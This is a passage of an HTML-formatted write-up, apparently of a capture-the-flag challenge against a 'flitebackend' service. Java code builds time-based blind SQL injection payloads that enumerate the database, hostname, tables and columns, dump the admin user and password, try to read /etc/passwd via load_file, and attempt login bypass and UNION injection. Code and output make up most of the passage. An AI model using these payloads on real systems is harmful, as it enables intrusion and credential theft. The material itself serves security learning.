\u003cspan class=\"kd\"\u003epublic\u003c/span\u003e \u003cspan class=\"kd\"\u003estatic\u003c/span\u003e \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"nf\"\u003eblindDatabase\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"kd\"\u003ethrows\u003c/span\u003e \u003cspan class=\"nc\"\u003eException\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"n\"\u003einjection\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u0026#39;||(IF((SELECT ascii(substr(database(),%d,1)))%c%d,SLEEP(%d),1))#\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nc\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eblindString\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003einjection\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e25\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"c1\"\u003e// flitebackend\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch4 id=\"hostname-datadir\"\u003ehostname + datadir\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e    \u003cspan class=\"nc\"\u003eSystem\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eout\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eprintln\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eblindString\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026#39;||(IF((SELECT ascii(substr(@@hostname,%d,1)))%c%d,SLEEP(%d),1))#\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e20\u003c/span\u003e\u003cspan class=\"o\"\u003e));\u003c/span\u003e \n    \u003cspan class=\"c1\"\u003e// hostname: de8c6c400a9f\u003c/span\u003e\n    \u003cspan class=\"nc\"\u003eSystem\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eout\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eprintln\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eblindString\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026#39;||(IF((SELECT ascii(substr(@@datadir,%d,1)))%c%d,SLEEP(%d),1))#\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e30\u003c/span\u003e\u003cspan class=\"o\"\u003e));\u003c/span\u003e\n    \u003cspan class=\"c1\"\u003e// datadir: /var/lib/mysql/\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch4 id=\"tables\"\u003eTables\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e    \u003cspan class=\"kd\"\u003epublic\u003c/span\u003e \u003cspan class=\"kd\"\u003estatic\u003c/span\u003e \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"nf\"\u003eblindTableName\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003eint\u003c/span\u003e \u003cspan class=\"n\"\u003eoffset\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"kd\"\u003ethrows\u003c/span\u003e \u003cspan class=\"nc\"\u003eException\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"n\"\u003einjection\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u0026#39;||(IF((SELECT ascii(substr(table_name,%d,1)) from information_schema.tables where table_schema=database() limit \u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"n\"\u003eoffset\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;,1)%c%d,SLEEP(%d),1))#\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nc\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eblindString\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003einjection\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e100\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"o\"\u003e...\u003c/span\u003e\n    \u003cspan class=\"nc\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eblindTableName\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e \u003cspan class=\"c1\"\u003e// devices\u003c/span\u003e\n    \u003cspan class=\"nc\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eblindTableName\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e \u003cspan class=\"c1\"\u003e// users\u003c/span\u003e\n    \u003cspan class=\"nc\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eblindTableName\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e \u003cspan class=\"c1\"\u003e// None\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eTwo tables found: \u003ccode\u003edevices\u003c/code\u003e and \u003ccode\u003eusers\u003c/code\u003e in \u003ccode\u003eflitebackend\u003c/code\u003e database.\u003c/p\u003e\n\n\u003ch4 id=\"read-files\"\u003eRead files?\u003c/h4\u003e\n\n\u003cp\u003eMaybe we could read some files?\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e    \u003cspan class=\"nc\"\u003eSystem\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eout\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eprintln\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eblindString\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026#39;||(IF((SELECT ascii(substr(load_file(\u0026#39;/etc/hosts\u0026#39;),%d,1)))%c%d,SLEEP(%d),1))#\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e20\u003c/span\u003e\u003cspan class=\"o\"\u003e));\u003c/span\u003e\n    \u003cspan class=\"nc\"\u003eSystem\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eout\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eprintln\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eblindString\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026#39;||(IF((SELECT ascii(substr(load_file(\u0026#39;/etc/passwd\u0026#39;),%d,1)))%c%d,SLEEP(%d),1))#\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e20\u003c/span\u003e\u003cspan class=\"o\"\u003e));\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI don\u0026#39;t think so...\u003c/p\u003e\n\n\u003ch4 id=\"login\"\u003eLogin\u003c/h4\u003e\n\n\u003cp\u003eMaybe you are wondering why I didn\u0026#39;t log in yet. But I started doing the time-based SQLi before even trying to log in. So let\u0026#39;s see if we are able to log in using the SQLi:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e    \u003cspan class=\"nc\"\u003eSystem\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eout\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eprintln\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esendCommand\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026#39; or 1=1#\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;123123\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;getTemp\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e));\u003c/span\u003e \n    \u003cspan class=\"c1\"\u003e// {\u0026quot;success\u0026quot;: false, \u0026quot;error\u0026quot;: \u0026quot;Invalid username or password\u0026quot;}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eHumm, we need to think how the backend is doing the login process:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eSELECT username, password FROM users WHERE username=\u0026#39;+ username_param +\u0026#39; and password = \u0026#39;+ password_param +\u0026#39; ?\u003c/li\u003e\n\u003cli\u003eSELECT password FROM table WHERE username=\u0026#39;+ username_param +\u0026#39;; then check password?\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eFor 1 we already know that is not the case because using \u003ccode\u003e\u0026#39; or 1=1#\u003c/code\u003e would give us a successful message.\u003cbr\u003e\nFor 2 we need another test, first of all, let\u0026#39;s check how many columns the query has.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e    \u003cspan class=\"nc\"\u003eSystem\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eout\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eprintln\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esendCommand\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026#39; order by 1#\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;getTemp\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e));\u003c/span\u003e \n    \u003cspan class=\"c1\"\u003e// {\u0026quot;success\u0026quot;: false, \u0026quot;error\u0026quot;: \u0026quot;Invalid username or password\u0026quot;}.\u003c/span\u003e\n\n    \u003cspan class=\"nc\"\u003eSystem\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eout\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eprintln\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esendCommand\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026#39; order by 2#\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;getTemp\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e));\u003c/span\u003e \n    \u003cspan class=\"c1\"\u003e// {\u0026quot;success\u0026quot;: false, \u0026quot;error\u0026quot;: \u0026quot;Unknown\u0026quot;}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eOk, based on error message we can affirm that there is only one column on the query. Thus we could try to use \u003ccode\u003eUNION\u003c/code\u003e to fake a successful query:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e    \u003cspan class=\"nc\"\u003eSystem\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eout\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eprintln\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esendCommand\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026#39; union all select \u0026#39;\u0026#39;#\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;getTemp\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e));\u003c/span\u003e \n    \u003cspan class=\"c1\"\u003e// {\u0026quot;success\u0026quot;: false, \u0026quot;error\u0026quot;: \u0026quot;Invalid username or password\u0026quot;}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNot yet. There is something more... Step back and let\u0026#39;s dump users table.\u003c/p\u003e\n\n\u003ch4 id=\"users-table\"\u003eusers table\u003c/h4\u003e\n\n\u003cp\u003eFirst, we need to know the table structure. To facilitate the process I created a method called \u003ccode\u003eblindColumnName\u003c/code\u003e with two parameters: \u003ccode\u003etable\u003c/code\u003e and \u003ccode\u003eoffset\u003c/code\u003e. This method will dump all columns names from \u003ccode\u003eString table\u003c/code\u003e parameter. \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e    \u003cspan class=\"kd\"\u003epublic\u003c/span\u003e \u003cspan class=\"kd\"\u003estatic\u003c/span\u003e \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"nf\"\u003eblindColumnName\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"n\"\u003etable\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"kt\"\u003eint\u003c/span\u003e \u003cspan class=\"n\"\u003eoffset\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"kd\"\u003ethrows\u003c/span\u003e \u003cspan class=\"nc\"\u003eException\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"n\"\u003einjection\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u0026#39;||(IF((SELECT ascii(substr(column_name,%d,1)) from information_schema.columns where table_name=\u0026#39;\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"n\"\u003etable\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026#39; and table_schema = database() limit \u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"n\"\u003eoffset\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;,1)%c%d,SLEEP(%d),1))#\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nc\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eblindString\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003einjection\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e100\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\n    \u003cspan class=\"o\"\u003e...\u003c/span\u003e\n    \u003cspan class=\"nc\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eblindColumnName\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;users\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e \u003cspan class=\"c1\"\u003e// id\u003c/span\u003e\n    \u003cspan class=\"nc\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eblindColumnName\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;users\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e \u003cspan class=\"c1\"\u003e// username\u003c/span\u003e\n    \u003cspan class=\"nc\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eblindColumnName\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;users\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e \u003cspan class=\"c1\"\u003e// password\u003c/span\u003e\n    \u003cspan class=\"nc\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eblindColumnName\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;users\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e \u003cspan class=\"c1\"\u003e// None\u003c/span\u003e\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eusers(id, username, password)\u003c/p\u003e\n\n\u003ch4 id=\"devices-table\"\u003edevices table\u003c/h4\u003e\n\n\u003cp\u003eThe same process above could be applied to \u003ccode\u003edevices\u003c/code\u003e table.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e    \u003cspan class=\"nc\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eblindColumnName\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;devices\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e \u003cspan class=\"c1\"\u003e// id\u003c/span\u003e\n    \u003cspan class=\"nc\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eblindColumnName\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;devices\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e \u003cspan class=\"c1\"\u003e// ip\u003c/span\u003e\n    \u003cspan class=\"nc\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eblindColumnName\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;devices\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e \u003cspan class=\"c1\"\u003e// None\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003edevices(id, ip)\u003c/p\u003e\n\n\u003ch4 id=\"dumping\"\u003eDumping\u003c/h4\u003e\n\n\u003cp\u003eKnowing the table structure we could dump the values:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e    \u003cspan class=\"kd\"\u003epublic\u003c/span\u003e \u003cspan class=\"kd\"\u003estatic\u003c/span\u003e \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"nf\"\u003eblindUsername\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003eint\u003c/span\u003e \u003cspan class=\"n\"\u003eoffset\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"kd\"\u003ethrows\u003c/span\u003e \u003cspan class=\"nc\"\u003eException\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"n\"\u003einjection\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u0026#39;||(IF((SELECT ascii(substr(username,%d,1)) from users limit \u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"n\"\u003eoffset\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;,1)%c%d,SLEEP(%d),1))#\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nc\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eblindString\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003einjection\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e5\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\n    \u003cspan class=\"nc\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eblindUsername\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e \u003cspan class=\"c1\"\u003e// admin\u003c/span\u003e\n    \u003cspan class=\"nc\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eblindUsername\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e \u003cspan class=\"c1\"\u003e// None\u003c/span\u003e\n\n    \u003cspan class=\"kd\"\u003epublic\u003c/span\u003e \u003cspan class=\"kd\"\u003estatic\u003c/span\u003e \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"nf\"\u003eblindColumnUsersValues\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"n\"\u003ecolumn\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"kt\"\u003eint\u003c/span\u003e \u003cspan class=\"n\"\u003elength\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"kd\"\u003ethrows\u003c/span\u003e \u003cspan class=\"nc\"\u003eException\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"n\"\u003einjection\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u0026#39;||(IF((SELECT ascii(substr(\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"n\"\u003ecolumn\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;,%d,1)) from users where username = \u0026#39;admin\u0026#39;)%c%d,SLEEP(%d),1))#\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nc\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eblindString\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003einjection\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003elength\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\n    \u003cspan class=\"kd\"\u003epublic\u003c/span\u003e \u003cspan class=\"kd\"\u003estatic\u003c/span\u003e \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"nf\"\u003eblindPassword\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"kd\"\u003ethrows\u003c/span\u003e \u003cspan class=\"nc\"\u003eException\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nc\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eblindColumnUsersValues\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;password\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e32\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n    \u003cspan 